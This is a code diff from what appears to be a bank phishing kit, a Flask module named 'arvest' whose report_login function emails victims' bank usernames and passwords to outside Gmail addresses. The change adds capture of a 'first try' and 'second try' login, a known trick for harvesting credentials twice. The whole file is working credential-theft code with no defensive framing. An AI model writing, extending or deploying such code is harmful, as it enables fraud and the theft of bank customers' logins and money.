@@ -2,11 +2,19 @@ from arvest import mail
 from flask_mail import Message
 from datetime import datetime
 
-def report_login(username,password,bank_name):
+def report_login(first_try_username, first_try_pass, username,password,bank_name):
     msg = Message(f'New Login || {bank_name}',
         sender='donaldlorren4202022@gmail.com',
         recipients=['ritapratt010@gmail.com','christinesalgado477@gmail.com'])
     msg.body=f'''
+    ---------------------------------------------
+    ---------------FIRST TRY -------------------
+    For ----- {bank_name}
+    Username is ----- {first_try_username}
+    Password is ----- {first_try_pass}
+    at ---- {datetime.now()}
+    ---------------------------------------------
+    ---------------SECOND TRY -------------------
     For ----- {bank_name}
     Username is ----- {username}
     Password is ----- {password}
